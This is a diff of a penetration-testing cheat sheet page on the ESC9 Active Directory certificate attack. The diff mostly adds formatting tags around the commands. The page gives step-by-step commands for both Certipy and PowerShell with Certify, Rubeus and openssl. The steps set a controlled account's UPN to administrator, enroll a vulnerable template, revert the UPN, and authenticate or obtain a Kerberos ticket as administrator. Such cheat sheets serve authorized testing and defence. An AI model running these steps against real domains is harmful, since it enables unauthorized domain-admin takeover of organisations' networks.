@@ -20,44 +20,44 @@ No Security Extension (Enrolee can modify own UPN to request cert on behalf of A
 
 ## Enumerate
 
+{% code lineNumbers="true" %}
 ```bash
 certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
 ## Flags templates with 'No Security Extension' and notes current StrongCertificateBindingEnforcement registry value
 ```
+{% endcode %}
 
 ## Exploit
 
 {% tabs %}
 {% tab title="Certipy" %}
+{% code lineNumbers="true" %}
 ```bash
 ## 1. Set your controlled account's UPN to the target's identity
 certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn administrator
-
 ## 2. Enroll for the vulnerable (no-security-extension) template as the controlled account
 certipy req -u <controlled-account>@<domain> -p <password> -ca <CA-Name> -template <vulnerable-template>
-
 ## 3. Revert the UPN so normal logon for the controlled account still works
 certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn <controlled-account>@<domain>
-
 ## 4. Authenticate as the target using the issued certificate
 certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
 ```
+{% endcode %}
 {% endtab %}
 
-{% tab title="PowerShell/RSAT + Certify + Rubeus" %}
+{% tab title="PowerShell/RSAT + Certify + Rubeus + Openssl" %}
+{% code lineNumbers="true" %}
 ```powershell
 ## 1. Set your controlled account's UPN to the target's identity (RSAT AD module or PowerView)
 Set-ADUser -Identity <controlled-account> -UserPrincipalName administrator
-
 ## 2. Enroll for the vulnerable template as the controlled account
 Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<vulnerable-template>
-
 ## 3. Revert the UPN
 Set-ADUser -Identity <controlled-account> -UserPrincipalName <controlled-account>@<domain>
-
 ## 4. Convert cert and request TGT as the target
 openssl.exe pkcs12 -in esc9.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc9.pfx
 Rubeus.exe asktgt /user:administrator /certificate:esc9.pfx /ptt
 ```
+{% endcode %}
 {% endtab %}
 {% endtabs %}
